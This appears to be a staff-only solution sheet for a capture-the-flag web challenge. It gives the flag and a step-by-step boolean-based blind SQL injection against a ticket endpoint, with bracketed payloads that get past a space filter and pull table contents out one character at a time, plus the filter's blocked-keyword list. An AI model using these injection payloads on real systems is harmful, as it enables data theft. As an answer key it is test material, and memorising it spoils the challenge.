# Solution (staff only, do not share with players)

Flag: CGS{b00l_tick3t_p4rts}

The vulnerable endpoint is /ticket?id=. Everything else (department filter,
all other pages) uses parameterized queries and is safe.

1. Open a ticket: /ticket?id=1
2. Test: /ticket?id=1 AND 1=1 gives "Request rejected" because a space is
   blocked. No SQL error is ever shown.
3. Bypass the space with brackets: /ticket?id=(1)and(1=1) shows the
   ticket. /ticket?id=(1)and(1=2) shows "Ticket not found". This confirms
   boolean-based blind SQL injection.
4. Find the table names via sqlite_master:
   /ticket?id=(1)and((select(count(*))from(sqlite_master)where(name='vault_a'))=1)
5. Get the length of the first part:
   /ticket?id=(1)and((select(length(content))from(vault_a)where(label='key_part_1'))=5)
6. Extract each character:
   /ticket?id=(1)and((select(substr(content,1,1))from(vault_a)where(label='key_part_1'))='b')
7. Repeat for positions 1-5 to get: b00l_
8. Repeat the same steps for vault_b / key_part_2 (length 12) to get:
   tick3t_p4rts
9. Combine: CGS{b00l_tick3t_p4rts}

Blocked keywords: union, sleep, benchmark, load_extension, randomblob,
--, /*, #, and any whitespace. sqlmap does not work out of the box here
because of the space filter; it needs a tamper script.
